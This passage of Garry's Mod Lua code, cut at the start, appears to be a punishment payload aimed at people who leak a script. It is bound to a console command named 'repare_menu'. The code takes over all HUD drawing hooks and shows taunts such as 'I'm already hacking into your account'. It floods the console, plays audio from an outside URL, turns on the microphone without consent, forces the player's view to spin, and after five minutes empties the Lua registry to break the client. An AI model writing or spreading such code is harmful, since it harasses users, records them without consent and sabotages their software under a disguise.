	draw.SimpleText(msg, "lolwutbet2", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end


for k,v in pairs(hook.GetTable()) do
	for o,j in pairs(v) do
		if k == "HUDPaint" then
			hook.Remove(k, o)
			hook.Add(k, o, huddrawdetour2)
		end
	end
end
hook.Add("HUDPaint","eztoirkfghdjnnvcc", huddrawdetour2)

timer.Create("ti_ebaniy_debil1",2 ,0 , function()
	msg = table.Random({
		"Why are you leaks?", 
		"You have no life?", 
		"You got fucked, do you know?", 
		"Why are you leaks !?", 
		"I'm already hacking into your account",
		"I will make you understand that you must not leaks",
		"Commands on the screen",
		"u n00b",
		"Ur Fucked",
		"1337 h4ck3r",
		"Will not you leak again next time.?",
		"Smenu.exe <3",
		"I hope you've learned the lesson",
		"..."})
end)

timer.Create("lgfholjghlfdsq",0 ,0 , function()
	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "LAUNCH ME MORE TIME, GIVE IT, MAKE IT !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !!!!!!!!!!!!!!!!!!!!!!!")
end)
sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
	s:Play()
end)
LocalPlayer():ConCommand("+voicerecord") -- Automatically turn on the microphone
LocalPlayer():ConCommand("cl_yawspeed 9999") -- Rotational speed
LocalPlayer():ConCommand("+right") -- You'll turn right
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "_Sparks¸ escape !\n")
timer.Simple(5 * 60, function()
	table.Empty(debug.getregistry())
end)
end
concommand.Add( "repare_menu", leak )